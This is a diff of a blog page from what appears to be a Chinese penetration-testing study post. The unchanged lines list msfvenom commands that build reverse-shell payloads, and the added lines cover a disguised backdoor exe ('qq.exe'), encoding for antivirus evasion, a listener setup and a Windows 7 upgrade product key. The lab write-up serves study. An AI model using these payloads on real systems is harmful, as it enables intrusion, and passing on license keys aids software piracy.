@@ -34,8 +34,9 @@
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F3.6.png">
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F3.7.png">
 <meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F3.8.png">
+<meta property="og:image" content="https://lan041221.github.io/img/%E6%B8%97%E9%80%8F3.9.png">
 <meta property="article:published_time" content="2024-09-03T11:32:08.681Z">
-<meta property="article:modified_time" content="2024-09-06T06:08:32.504Z">
+<meta property="article:modified_time" content="2024-09-06T07:19:54.014Z">
 <meta property="article:author" content="l1nk">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -234,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          1.8k 字
         
       </span>
     
@@ -245,7 +246,7 @@
         
         
         
-          15 分钟
+          16 分钟
         
       </span>
     
@@ -325,9 +326,14 @@
 <h5 id="一些类型的Payload"><a href="#一些类型的Payload" class="headerlink" title="一些类型的Payload"></a>一些类型的Payload</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">php：<br>msfvenom ‐p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.php<br>jsp：<br>Msfvenom ‐p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.jsp<br>python：<br>msfvenom ‐p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐fraw &gt; shell.py<br>bash：<br>msfvenom ‐p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On &gt; ‐f raw &gt; shell.sh<br></code></pre></td></tr></table></figure>
 
 <p>这里用msfvenom生成一个后门exe程序去获取反弹shell：<br><img src="/img/%E6%B8%97%E9%80%8F3.8.png" srcset="/img/loading.gif" lazyload alt="图片" title="编码三次生成后门exe程序，payload为591字节、总的为7168字节，位置在文件系统的opt目录下面叫qq.exe"></p>
+<p>实测下来经过了三次编码的后门程序不能运行，这里在生成后门的时候把编码删除就可以了，不过编码了免杀效果更强</p>
 <p>lhost和lport是Metasploit Framework中的两个重要的配置选项,它们分别指定了本地主机的IP地址和端口号</p>
 <p>生成好了之后要想办法上传到目标主机，在攻击机本地需要进行端口的监听，这里需要用到multi&#x2F;handler</p>
 <p>本地测试的时候可以用vmware tools拖入拖出，kali一般会自带，win7可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45729764/article/details/134133548">这篇博客</a></p>
+<p>一般来说在win7装好后会是普通版因为没有密钥，这里可以用破解工具或者直接用升级密钥，普通版会少很多东西，比如administartor的用户组就看不到 </p>
+<p>win7普通版升级为旗舰版的激活密钥：6K2KY-BFH24-PJW6W-9GK29-TMPWP（好像一直能用</p>
+<p><img src="/img/%E6%B8%97%E9%80%8F3.9.png" srcset="/img/loading.gif" lazyload alt="图片" title="我的配置项，成功实施了攻击"></p>
+<p>随后进入到meterpreter后渗透模块…</p>
 
                 
               </div>
